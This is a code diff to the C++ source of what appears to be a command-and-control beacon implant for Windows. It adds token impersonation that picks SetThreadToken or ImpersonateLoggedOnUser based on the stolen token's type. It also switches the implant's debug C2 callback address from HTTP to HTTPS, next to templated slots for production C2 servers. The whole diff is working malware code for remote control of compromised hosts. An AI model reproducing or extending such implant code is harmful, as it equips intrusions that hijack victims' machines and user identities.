@@ -161,7 +161,12 @@ void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::
                 auto it_2 = sysHandlers.find(it->type());
                 auto htoken = token::getToken();
                 if (htoken != INVALID_HANDLE_VALUE) {
-                    auto res = SetThreadToken(NULL,token::getToken());
+                    token::Token t{token::getToken()};
+                    BOOL res = FALSE;
+                    if (t.TokenType == TokenImpersonation)
+                        res = SetThreadToken(NULL, token::getToken());
+                    else
+                        res = ImpersonateLoggedOnUser(token::getToken());
                     //auto res = ImpersonateLoggedOnUser(token::getToken());
                     if (res == FALSE)
                         std::cout << "SetThreadToken failed with error: " << GetLastError() << std::endl;
@@ -540,7 +545,7 @@ int Entry() {
 #endif
 #ifdef HTTP
 #ifdef DEBUG
-    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "http://192.168.161.50" }, 10, 10, 10);
+    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "https://192.168.161.50" }, 10, 10, 10);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "{{$value}}" }, 10, 10, 10);
@@ -551,7 +556,7 @@ int Entry() {
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
 #ifdef DEBUG
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("http://192.168.161.50", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
